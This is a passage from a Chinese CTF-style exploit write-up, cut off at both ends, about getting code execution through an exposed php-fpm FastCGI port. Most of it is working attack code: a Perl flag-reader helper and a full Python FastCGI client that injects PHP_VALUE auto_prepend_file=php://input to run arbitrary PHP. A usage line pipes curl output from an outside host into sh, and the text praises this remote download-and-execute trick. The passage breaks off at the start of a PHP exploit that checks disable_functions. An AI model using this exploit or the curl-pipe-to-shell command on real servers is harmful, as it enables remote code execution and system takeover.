<p>被base64编码的内容如下<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3(\*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line"></span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r=<span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure></p>
<p>PS: 这种远程下载执行的方法可以有效缩短执行代码的长度</p>
<p>攻击代码的生成<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    <span class="keyword">print</span> response</span><br><span class="line">    <span class="comment"># print("gopher://127.0.0.1:" + str(args.port) + "/_" + response)</span></span><br></pre></td></tr></table></figure></p>
<p>使用方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fastcgi.py 127.0.0.1 /var/www/html/index.php -c &quot;&lt;?php system(&apos;curl http://ebcece08.w1n.pw/getflag | sh&apos;);die(&apos;zeroyu&apos;);?&gt;&quot;</span><br></pre></td></tr></table></figure></p>
<h4 id="5-EXP"><a href="#5-EXP" class="headerlink" title="5. EXP"></a>5. EXP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$disable_functions = ini_get(<span class="string">"disable_functions"</span>);</span><br><span class="line">$loadext = get_loaded_extensions();</span><br><span class="line"><span class="keyword">foreach</span> ($loadext <span class="keyword">as</span> $ext) &#123;</span><br><span 